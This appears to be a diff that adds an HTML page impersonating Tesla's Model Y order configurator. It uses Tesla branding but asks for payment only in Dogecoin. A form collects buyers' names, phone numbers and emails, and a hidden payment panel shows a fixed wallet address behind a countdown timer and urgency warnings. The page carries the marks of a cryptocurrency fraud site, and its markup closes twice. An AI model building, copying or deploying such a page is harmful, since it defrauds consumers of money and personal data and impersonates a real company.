@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <link rel="stylesheet" href="style.css">
+  <title>Design Your Model Y | Tesla</title>
+    <meta name="description" content="Tesla is accelerating the world's transition to sustainable energy with electric cars, solar and integrated renewable energy solutions for homes and businesses.">
+  <link rel="icon" href="https://www.tesla.com/themes/custom/tesla_frontend/assets/favicons/favicon.ico">
+</head>
+
+<body>
+
+  <div class="main-container">
+    <!-- Left Visual Side -->
+    <div class="left-side">
+      <div id="visual-area">
+        <img id="main-image" src="images/Model Y/overview.jpg" alt="Model Y Visual">
+      </div>
+    </div>
+
+    <!-- Right Config Side -->
+    <div class="right-side" id="config-panel">
+
+      <section id="overview" class="config-section">
+        <h2 class="x">Model Y</h2>
+        <div class="info">
+          <div class="in">
+            <div class="t-info">321<sub>mi</sub></div>
+            <div class="b-info">Range(EPA est.)</div>
+          </div><hr>
+          <div class="in">
+            <div class="t-info">125<sub>mph</sub></div>
+            <div class="b-info">Top Speed</div>
+          </div><hr>
+          <div class="in">
+            <div class="t-info">6.8<sub>sec</sub></div>
+            <div class="b-info">0-60mph</div>
+          </div>
+        </div><hr>
+
+        <div class="amount">
+          <div class="amt">
+            <p class="a">All-Wheel Drive</p>
+            <div class="p">
+              <p class="a">$40,000</p>
+              <p class="a"><img src="images/Model Y/dogecoin.png" width="10px" height="10px">206003.70</p>
+            </div>
+          </div>
+          <div class="amt">
+            <div class="p">
+              <p class="a"><img src="images/Model Y/dogecoin.png" width="10px" height="10px">3425.31</p>
+              <p class="a">Duration</p>
+            </div>
+            <div class="p">
+              <p class="a">Monthly</p>
+              <p class="a">3 years</p>
+            </div>
+          </div>
+        </div>
+
+      </section>
+
+      <section id="colors" class="config-section">
+        <p class="y">Included</p>
+        <div class="color-options">
+          <!-- Color buttons (JS will render) -->
+        </div>
+        <p class="y">Full Self-Driving(Supervised)</p>
+        <p>
+          Your car will be able to drive itself almost anywhere with minimal driver intervention
+          <br><br>
+          Currently enabled features requires active driver supervision and do not make the vehicle autonomous. The activation and use of these features are dependent on development and regulatory approval, which may take longer in some jurisdiction
+        </p>
+
+      </section>
+
+      <section id="wheels" class="config-section">
+        <h2>Wheel</h2>
+        <div class="wheel-options">
+          <!-- Wheel buttons (JS will render) -->
+        </div>
+        <p class="y">Choose your wheels.</p>
+
+        <p class="y">Charging</p>
+        <div class="r"><img src="images/Model Y/10010.png" width="80px" height="80px" border-radius="2px"></div>
+        <p>Every Tesla includes access to the largest global Supercharging network</p>
+        <p class="y">Free Superharging included</p>
+        
+      </section>
+
+      <section id="interior" class="config-section">
+        <h2>Interior</h2>
+        <div class="interior-options">
+          <!-- Interior buttons (JS will render) -->
+        </div>
+        <p class="y">Select your interior style.</p>
+        
+        <div class="attribute">
+          <div class="att">
+            <h4>360-Degree Visibility</h4>
+            <p class="b">Onboard cameras detect nearbyobjects, pedestrians and vehicles</p>
+          </div>
+          <div class="att">
+            <h4>Active Safety</h4>
+            <p class="b">Automatic Emergency Braking, lane assist, Foward and Blind-Spot Collision Warning</p>
+          </div>
+          <div class="att">
+            <h4>Passive Safety</h4>
+            <p class="b">A rigid body, fortified battery pack and large crumple zone for greater impact protection</p>
+          </div>
+        </div>
+
+        <div class="instruction">
+          <p class="y">Payment Instruction</p>
+          <p>
+            Kindly note the following instructions.
+            <br><br>
+            <sup>1</sup>Unlike the main Tesla website, payment here is with crypto currency (Doge coin to be precise)
+            <br><br>
+            <sup>2</sup>Avtivities on this platform is highly monitored, before you fill in your information for payment, get your doge coin ready
+            <br><br>
+            <sup>3</sup>After filling your information and clicked on the Order Now button, you have less than thirty minutes to make the specified amount of payment. Proceed with caution. 
+          </p>
+        </div>
+
+      </section>
+
+      <!-- Application form & Payment guideline (added) -->
+      <section id="application" class="config-section">
+        
+        <form id="app-form" autocomplete="off">
+          <div class="form-row">
+            <label>Delivery Zip
+              <input type="text" id="delivery-zip" name="zip" required>
+            </label>
+            <label>Postal Code
+              <input type="text" id="postal-code" name="postal" required>
+            </label>
+          </div>
+          <div class="form-row">
+            <label>First name
+              <input type="text" placeholder="John" id="first" name="first" required>
+            </label>
+            <label>Last name
+              <input type="text" placeholder="Doe" id="last" name="last" required>
+            </label>
+          </div>
+          <div class="form-row">
+            <label>Mobile number
+              <input type="tel" id="mobile" name="mobile" required>
+            </label>
+            <label>E-mail address
+              <input type="email" id="email" name="email" required>
+            </label>
+          </div>
+          <div class="form-row">
+            <button type="submit" id="make-payment-btn">Order Now</button>
+          </div>
+          <p>By placing this order, I agree to the <button onclick="location.href='terms.pdf'">Model Y Order Agreement</button> </p>
+        </form>
+
+        <div id="payment-guideline" style="display:none; margin-top:1rem; border:1px solid #ccc; padding:1rem;">
+          <h3>Payment Instructions</h3>
+          <strong><span id="countdown">60:00</span></strong>
+          <p id="pg-instructions">
+            <p class="a">Please transfer <img src="images/Model Y/dogecoin.png" width="10px" height="10px">3425.31 to the Dogecoin wallet below. You have one hour to complete the transfer. After you have transfered the required amount, click <em>Done</em>.</p>
+          </p>
+          <div style="background:#f7f7f7; padding:0.5rem; word-break:break-all;">
+            <div style="display:flex; align-items:center; justify-content:space-between; gap:8px;">
+              <strong>Wallet address:</strong>
+              <div style="display:flex; align-items:center; gap:8px;">
+                <button id="copy-wallet-btn" type="button" aria-label="Copy wallet address" style="font-size:0.9rem;padding:6px 10px;border-radius:4px;border:1px solid #ccc;background:#16a34a;color: #fff;cursor:pointer;">Copy</button>
+              </div>
+            </div>
+            <div id="wallet-address" style="margin-top:0.5rem; font-family:monospace;">DFMiNUCikU5Te5MaUH8DELjmNoYYepxveW</div>
+            <div id="copy-feedback" aria-live="polite" style="color:green;margin-top:6px;font-size:0.9rem;"></div>
+          </div>
+          <div style="margin-top:0.75rem;">
+            <button id="done-btn">Done</button>
+            <button id="close-guideline-btn" style="margin-left:.5rem">Close</button>
+          </div>
+          <p id="payment-status" style="margin-top:.5rem; color:rgb(0, 128, 0);"></p>
+        </div>
+      </section>
+
+      <!-- Payment confirmed (added) -->
+      <section id="payment-confirmed" class="config-section" style="display:none;">
+        <h2>Payment Confirmed</h2>
+        <div id="confirmed-content" style="padding:12px;">
+          <!-- Filled by JS -->
+        </div>
+        <div style="margin-top:10px;">
+          <button id="confirmed-ok-btn">OK</button>
+        </div>
+      </section>
+
+      <section id="summary" class="config-section">
+        <h2>Summary</h2>
+        <div id="summary-content">
+          <!-- Summary (JS will render) -->
+        </div>
+      </section>
+
+    </div>
+  </div>
+</body>
+</html>
+  <script src="script.js"></script>
+</body>
+</html>
